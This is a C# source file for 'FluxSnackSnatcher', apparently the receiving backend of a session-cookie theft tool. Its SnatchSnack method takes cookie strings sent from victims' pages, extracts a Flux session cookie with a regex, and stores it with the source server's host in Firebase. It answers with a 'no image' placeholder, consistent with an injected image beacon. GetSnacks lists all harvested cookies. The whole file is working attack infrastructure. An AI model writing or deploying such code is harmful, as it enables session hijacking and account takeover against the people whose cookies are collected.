﻿using FluxSnackSnatcher.Models;
using FluxSnackSnatcher.Services;
using System.Text.RegularExpressions;

namespace FluxSnackSnatcher.Facades
{
    public class SnatcherFacade : ISnatcherFacade
    {
        private readonly IFirebaseService _firebaseService;

        public SnatcherFacade(IFirebaseService firebaseService)
        {
            _firebaseService = firebaseService;
        }

        public async Task<string> SnatchSnack(string? snacks, string url)
        {
            try
            {
                string unescapedUrl = Uri.UnescapeDataString(url);

                var sections = unescapedUrl.Split("/");

                url = sections[2];

                Console.WriteLine($"Snatching snacks from {url}");

                if (!string.IsNullOrEmpty(snacks))
                {
                    var match = Regex.Match(snacks, Constants.FLUX_COOKIE_REGEX);

                    if (match.Success)
                    {
                        var cookie = new CookieData
                        {
                            ServerUrl = url,
                            Name = Constants.FLUX_COOKIE_NAME,
                            Value = match.Groups[1].Value,
                            AddedAt = DateTime.Now
                        };

                        var response = await _firebaseService.SetCookie(cookie);

                        Console.WriteLine(response);
                    }
                }

                return Constants.NO_IMAGE;
            }
            catch (Exception)
            {
                return Constants.NO_IMAGE;
            }
        }

        public async Task<List<CookieData>> GetSnacks()
        {
            var snacks = await _firebaseService.GetCookies();

            return snacks;
        }
    }
}